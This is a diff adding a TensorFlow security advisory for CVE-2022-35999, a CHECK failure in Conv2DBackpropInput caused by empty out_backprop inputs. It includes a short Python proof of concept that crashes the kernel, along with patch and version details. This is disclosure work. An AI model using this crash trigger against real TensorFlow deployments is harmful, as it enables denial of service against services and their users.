@@ -1,0 +1,28 @@
+<h2>TFSA-2022-121: <code>CHECK</code> fail in <code>Conv2DBackpropInput</code></h2>
+<h3>CVE Number</h3>
+<p>CVE-2022-35999</p>
+<h3>Impact</h3>
+<p>When <code>Conv2DBackpropInput</code> receives empty <code>out_backprop</code> inputs (e.g. <code>[3, 1, 0, 1]</code>), the current CPU/GPU kernels <code>CHECK</code> fail (one with dnnl, the other with cudnn). This can be used to trigger a denial of service attack.
+```python
+import tensorflow as tf
+import numpy as np
+input_sizes = [3, 1, 1, 2]
+filter = np.ones([1, 3, 2, 3])
+out_backprop = np.ones([3, 1, 0, 3])
+strides = [1, 1, 2, 1]
+padding = 'VALID'</p>
+<p>tf.raw_ops.Conv2DBackpropInput(
+   input_sizes = input_sizes,
+   filter = filter,
+   out_backprop = out_backprop,
+   strides = strides,
+   padding = padding
+)
+```</p>
+<h3>Patches</h3>
+<p>We have patched the issue in GitHub commit <a href="https://github.com/tensorflow/tensorflow/commit/27a65a43cf763897fecfa5cdb5cc653fc5dd0346">27a65a43cf763897fecfa5cdb5cc653fc5dd0346</a>.</p>
+<p>The fix will be included in TensorFlow 2.10.0. We will also cherrypick this commit on TensorFlow 2.9.1, TensorFlow 2.8.1, and TensorFlow 2.7.2, as these are also affected and still in supported range.</p>
+<h3>For more information</h3>
+<p>Please consult <a href="https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md">our security guide</a> for more information regarding the security model and how to contact us with issues and questions.</p>
+<h3>Attribution</h3>
+<p>This vulnerability has been reported by Jingyi Shi.</p>
